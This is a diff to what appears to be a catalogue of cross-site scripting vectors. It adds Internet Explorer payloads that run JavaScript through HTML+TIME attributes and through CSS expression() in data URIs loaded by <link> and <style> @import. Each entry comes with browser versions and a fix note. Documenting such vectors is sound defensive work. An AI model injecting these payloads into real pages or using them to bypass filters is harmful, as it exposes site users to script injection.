@@ -376,10 +376,10 @@ var items =
         'tags'       : ['surveillance', 'javascript', 'opera', 'html5', 'onforminput', 'onformchange'],
         'reporter'   : 'Skyphire, .mario'
     },
-    { /* ID 24 - JavaScript execution via HTML+TIME without user interaction  */
+    { /* ID 24 - JavaScript execution via HTML+TIME without user interaction (1) */
         'id'         : 24,
         'category'   : 'htmlplustime', 
-        'name'       : 'JavaScript execution via HTML+TIME without user interaction',
+        'name'       : 'JavaScript execution via HTML+TIME without user interaction (1)',
         'data'       : '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=%js_alert%&gt;`>',
         'description': 'This obfuscated vector uses HTML+TIME to execute JavaScript without user interaction - and without suspicious event handlers but just attributename and to attributes. Also a fake namespace is being used to have the tag look like a harmless <B>. This only works on Internet Explorer.',
         'tickets'    : [],
@@ -432,6 +432,54 @@ var items =
             'opera': ['8.x', '9.x', '10.x']
         },
         'tags'       : ['xss', 'javascript', 'css', 'opera', 'attribute selectors', 'proprietary'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 28 - JavaScript execution via HTML+TIME without user interaction (2)  */
+        'id'         : 28,
+        'category'   : 'htmlplustime', 
+        'name'       : 'JavaScript execution via HTML+TIME without user interaction (2)',
+        'data'       : '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>',
+        'description': 'This HTML+TIME vector utilized the attributes attributename and values to map ecoded markup into an attribute to execute JavaScript.',
+        'tickets'    : [],
+        'howtofix'   : 'As soon as the HTML+TIME namespace and the behavior property are mapped to a HTML element a whole range of new attributes to execute JavaScript is available. In user submitted html xmlns attributes should not be allowed - as well as behavior properties for style tags and attribtes. Don\'t rely on blacklisting when dealing with user submitted markup.',            
+        'browsers'   : {
+            'internet explorer': [
+                '5.5', '6.0', '7.0', '8.0', '9.0'
+            ]
+        },
+        'tags'       : ['xss', 'javascript', 'ie', 'behavior', 'html+time', 'attributename', 'valuees', 'proprietary'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 29 - JavaScript execution via <LINK> href attribute and data URI  */
+        'id'         : 29,
+        'category'   : 'css', 
+        'name'       : 'JavaScript execution via <LINK> href attribute and data URI',
+        'data'       : '<link rel=stylesheet href=data:,*%7bx:expression(write(4))%7d',
+        'description': 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <LINK> tag.',
+        'tickets'    : [],
+        'howtofix'   : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <LINK> tags will not be displayed unfiltered.',            
+        'browsers'   : {
+            'internet explorer': [
+                '8.0', '9.0'
+            ]
+        },
+        'tags'       : ['xss', 'javascript', 'ie', 'css', 'expression', 'datauri', 'proprietary'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 30 - JavaScript execution via <style> @import and data URI  */
+        'id'         : 30,
+        'category'   : 'css', 
+        'name'       : 'JavaScript execution via <STYLE> @import and data URI',
+        'data'       : '<style>@import "data:,*%7bx:expression(write(2))%7D";</style>',
+        'description': 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <STYLE> @import directive.',
+        'tickets'    : [],
+        'howtofix'   : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <STYLE> cannot contain the @import directive.',            
+        'browsers'   : {
+            'internet explorer': [
+                '8.0', '9.0'
+            ]
+        },
+        'tags'       : ['xss', 'javascript', 'ie', 'css', 'expression', 'datauri', 'proprietary'],
         'reporter'   : '.mario'
     }
 ]
